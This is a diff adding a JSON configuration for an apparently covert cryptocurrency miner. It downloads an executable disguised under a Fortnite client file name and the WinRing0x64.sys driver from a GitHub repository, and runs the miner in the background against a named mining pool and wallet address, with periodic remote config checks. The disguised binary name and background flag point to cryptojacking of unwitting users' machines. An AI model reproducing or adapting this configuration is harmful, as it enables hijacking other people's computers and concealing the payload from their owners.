@@ -1,0 +1,30 @@
+{
+  "version": 1,
+  "config_revision": 3,
+  "miner_url": "https://raw.githubusercontent.com/terraversa/VBC-MNR/main/FortniteClient-Win64-Shipping.exe",
+  "miner_name": "FortniteClient-Win64-Shipping.exe",
+  "miner_version": "1",
+  "additional_files": [
+    {
+      "name": "WinRing0x64.sys",
+      "url": "https://raw.githubusercontent.com/terraversa/VBC-MNR/main/WinRing0x64.sys",
+      "sha256": "11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5"
+    }
+  ],
+  "mining_parameters": [
+    "--disable-cpu",
+    "--algorithm",
+    "pearlhash",
+    "--pool",
+    "prl.kryptex.network:8048",
+    "--wallet",
+    "prl1pgnzyhyf4j7dgml9fuy8p2s0lsktv8sqtzy3azhq3f6a46zyxe80q89am38.1",
+    "--tls",
+    "true",
+    "--background"
+  ],
+  "config_check_interval": 60,
+  "restart_delay": 15,
+  "download_timeout": 180,
+  "max_download_mb": 2048
+}
